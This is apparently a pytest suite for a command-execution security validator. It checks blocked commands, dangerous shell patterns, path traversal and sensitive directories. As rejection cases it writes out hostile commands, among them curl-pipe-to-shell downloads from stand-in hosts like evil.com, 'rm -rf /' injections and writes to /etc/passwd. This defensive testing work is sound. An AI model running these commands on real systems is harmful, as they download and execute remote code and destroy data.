"""
Tests for SecurityValidator utility.

This module tests the comprehensive security validation framework for
command execution including pattern detection, argument validation, and path safety.
"""

from pathlib import Path
from unittest.mock import patch

import pytest

from saber.server.execution.base import ValidationResult
from saber.server.execution.utils.security_constants import (
    BLOCKED_COMMANDS,
    DANGEROUS_PATTERNS,
    DEFAULT_SECURITY_SETTINGS,
    SENSITIVE_DIRECTORIES,
)
from saber.server.execution.utils.security_validator import SecurityValidator


class TestSecurityValidator:
    """Test cases for SecurityValidator."""

    @pytest.fixture
    def validator(self):
        """Create a basic SecurityValidator instance."""
        return SecurityValidator()

    @pytest.fixture
    def validator_with_whitelist(self):
        """Create a SecurityValidator with allowed commands."""
        return SecurityValidator(allowed_commands=["file", "strings", "python3"])

    def test_initialization_default(self, validator):
        """Test default initialization."""
        assert validator._allowed_commands == set()

    def test_initialization_with_allowed_commands(self, validator_with_whitelist):
        """Test initialization with allowed commands."""
        assert "file" in validator_with_whitelist._allowed_commands
        assert "strings" in validator_with_whitelist._allowed_commands
        assert "python3" in validator_with_whitelist._allowed_commands

    def test_validate_base_command_allowed(self, validator):
        """Test validation of allowed base commands."""
        # Should not raise for commands not in blocked list
        validator.validate_base_command("grep")
        validator.validate_base_command("find")
        validator.validate_base_command("/usr/bin/file")

    def test_validate_base_command_blocked(self, validator):
        """Test validation of blocked base commands."""
        for blocked_cmd in ["sudo", "rm", "chmod", "su"]:
            with pytest.raises(ValueError, match=f"Command '{blocked_cmd}' is not allowed"):
                validator.validate_base_command(blocked_cmd)

    def test_validate_base_command_blocked_with_whitelist_override(self, validator_with_whitelist):
        """Test that whitelist can override blocked commands."""
        # python3 is in blocked list but should be allowed due to whitelist
        validator_with_whitelist.validate_base_command("python3")

        # Commands not in whitelist should still be blocked
        with pytest.raises(ValueError, match="Command 'sudo' is not allowed"):
            validator_with_whitelist.validate_base_command("sudo")

    def test_validate_base_command_empty(self, validator):
        """Test validation of empty command."""
        with pytest.raises(ValueError, match="Empty command not allowed"):
            validator.validate_base_command("")

    def test_validate_base_command_with_path(self, validator):
        """Test validation of command with full path."""
        # Should extract base command name
        validator.validate_base_command("/usr/bin/grep")

        with pytest.raises(ValueError, match="Command 'rm' is not allowed"):
            validator.validate_base_command("/bin/rm")

    def test_validate_command_string_clean(self, validator):
        """Test validation of clean command strings."""
        clean_commands = ["ls -la", "grep pattern file.txt", "find /tmp -name '*.log'", "cat file.txt"]

        for cmd in clean_commands:
            result = validator.validate_command_string(cmd)
            assert result.valid is True
            assert len(result.errors) == 0

    def test_validate_command_string_dangerous_patterns(self, validator):
        """Test detection of dangerous patterns."""
        dangerous_commands = [
            "ls; rm -rf /",  # Command injection
            "cat file.txt | sh",  # Pipe to shell
            "echo $(whoami)",  # Command substitution
            "cat `whoami`",  # Backtick substitution
            "ls > /etc/passwd",  # Redirect to sensitive file
            "curl http://evil.com | sh",  # Download and execute
            "rm -rf /tmp",  # Dangerous rm usage
        ]

        for cmd in dangerous_commands:
            result = validator.validate_command_string(cmd)
            assert result.valid is False
            assert len(result.errors) > 0

    def test_validate_command_string_null_byte(self, validator):
        """Test detection of null byte injection."""
        malicious_cmd = "ls\x00; rm -rf /"

        result = validator.validate_command_string(malicious_cmd)

        assert result.valid is False
        assert "Null bytes not allowed" in str(result.errors)

    def test_validate_command_string_excessive_length(self, validator):
        """Test detection of excessively long commands."""
        long_cmd = "a" * (DEFAULT_SECURITY_SETTINGS["max_command_length"] + 1)

        result = validator.validate_command_string(long_cmd)

        assert result.valid is False
        assert "Command string too long" in str(result.errors)

    def test_validate_command_string_control_characters(self, validator):
        """Test detection of control characters."""
        cmd_with_control = "ls\x01\x02"

        result = validator.validate_command_string(cmd_with_control)

        assert result.valid is False
        assert "Control characters not allowed" in str(result.errors)

    def test_validate_command_string_allowed_control_chars(self, validator):
        """Test that allowed control characters are permitted."""
        cmd_with_tabs = "grep\t'pattern'\nfile.txt"

        result = validator.validate_command_string(cmd_with_tabs)

        # Should pass - only check for dangerous patterns, not tabs/newlines
        # Might have other validation errors but not for control chars
        control_errors = [e for e in result.errors if "Control characters" in e]
        assert len(control_errors) == 0

    def test_validate_arguments_clean(self, validator):
        """Test validation of clean arguments."""
        clean_args = ["grep", "pattern", "file.txt"]

        result = validator.validate_arguments(clean_args)

        assert result.valid is True
        assert len(result.errors) == 0

    def test_validate_arguments_path_traversal(self, validator):
        """Test detection of path traversal in arguments."""
        traversal_args = ["cat", "../../../etc/passwd"]

        result = validator.validate_arguments(traversal_args)

        assert result.valid is False
        assert "Unsafe path in argument" in str(result.errors)

    def test_validate_arguments_shell_metacharacters(self, validator):
        """Test detection of shell metacharacters in arguments."""
        meta_args = ["echo", "hello & rm -rf /"]  # Use & instead of ; since semicolons are now allowed

        result = validator.validate_arguments(meta_args)

        assert result.valid is False
        assert "Shell metacharacters in argument" in str(result.errors)

    def test_validate_arguments_suspicious_extensions(self, validator):
        """Test warnings for suspicious file extensions."""
        suspicious_args = ["chmod", "+x", "script.sh"]

        result = validator.validate_arguments(suspicious_args)

        assert result.valid is True  # Should be valid but with warning
        assert "Executable file extension" in str(result.warnings)

    def test_validate_arguments_skip_base_command(self, validator):
        """Test that base command (index 0) is skipped in argument validation."""
        # Even if base command has metacharacters, it should be skipped
        args = ["echo;dangerous", "safe_arg"]

        result = validator.validate_arguments(args)

        # Should only validate arguments, not the base command
        assert result.valid is True

    def test_is_safe_path_relative_safe(self, validator):
        """Test safe relative paths."""
        safe_paths = ["file.txt", "subdir/file.txt", "./local_file"]

        for path in safe_paths:
            assert validator.is_safe_path(path) is True

    def test_is_safe_path_traversal_unsafe(self, validator):
        """Test unsafe path traversal attempts."""
        unsafe_paths = ["../../../etc/passwd", "dir/../../../root/.ssh"]

        for path in unsafe_paths:
            assert validator.is_safe_path(path) is False

    def test_is_safe_path_sensitive_directories(self, validator):
        """Test blocking of sensitive directories."""
        for sensitive_dir in SENSITIVE_DIRECTORIES:
            assert validator.is_safe_path(sensitive_dir + "/file") is False

    def test_is_safe_path_absolute_without_sandbox(self, validator):
        """Test absolute paths without sandbox."""
        # Safe absolute paths
        safe_absolute = ["/tmp/file.txt", "/var/tmp/data", "/home/user/file"]
        for path in safe_absolute:
            assert validator.is_safe_path(path) is True

        # Unsafe absolute paths
        unsafe_absolute = ["/bin/sh", "/usr/bin/sudo", "/etc/passwd"]
        for path in unsafe_absolute:
            assert validator.is_safe_path(path) is False

    def test_is_safe_path_invalid_path(self, validator):
        """Test handling of invalid paths."""
        # Test with invalid path characters or formats
        with patch("pathlib.Path.resolve", side_effect=OSError("Invalid path")):
            assert validator.is_safe_path("invalid::path") is False

    def test_validate_full_command_success(self, validator):
        """Test successful full command validation."""
        command_args = ["grep", "pattern", "file.txt"]

        result = validator.validate_full_command(command_args)

        assert result.valid is True
        assert len(result.errors) == 0

    def test_validate_full_command_empty(self, validator):
        """Test validation of empty command arguments."""
        result = validator.validate_full_command([])

        assert result.valid is False
        assert "Empty command arguments" in result.errors

    def test_validate_full_command_combined_errors(self, validator):
        """Test that command and argument validation errors are combined."""
        # Command with both dangerous patterns and unsafe arguments
        command_args = ["cat", "../etc/passwd; rm -rf /"]

        result = validator.validate_full_command(command_args)

        assert result.valid is False
        assert len(result.errors) >= 2  # Should have multiple error types

    def test_validate_full_command_warnings_preserved(self, validator):
        """Test that warnings from both validations are preserved."""
        command_args = ["chmod", "+x", "script.sh"]

        result = validator.validate_full_command(command_args)

        # Should have warnings about executable extension
        assert len(result.warnings) > 0
        assert "Executable file extension" in str(result.warnings)

    def test_get_security_info_default(self, validator):
        """Test security info with default configuration."""
        info = validator.get_security_info()

        assert info["allowed_commands"] is None
        assert info["dangerous_patterns_count"] == len(DANGEROUS_PATTERNS)
        assert info["blocked_commands_count"] == len(BLOCKED_COMMANDS)
        assert "security_limits" in info

    def test_get_security_info_with_config(self, validator_with_whitelist, tmp_path):
        """Test security info with custom configuration."""
        validator = SecurityValidator(
            allowed_commands=["file", "strings"],
        )

        info = validator.get_security_info()

        assert set(info["allowed_commands"]) == {"file", "strings"}

    def test_complex_command_validation(self, validator):
        """Test validation of complex real-world commands."""
        # Test cases that might appear in malware analysis
        test_cases = [
            # Safe commands
            ("file sample.exe", True),
            ("strings -n 10 malware.bin", True),
            ("hexdump -C file.dat | head -20", False),  # Pipe should be caught
            ("grep -i 'http' network.log", True),
            # Unsafe commands
            ("curl http://malicious.com/payload | sh", False),
            ("python3 -c 'import os; os.system(\"rm -rf /\")'", False),
            ("echo 'data' > /etc/important_file", False),
        ]

        for command, should_be_valid in test_cases:
            import shlex

            args = shlex.split(command)
            result = validator.validate_full_command(args)

            if should_be_valid:
                assert result.valid is True, f"Command should be valid: {command}"
            else:
                assert result.valid is False, f"Command should be invalid: {command}"
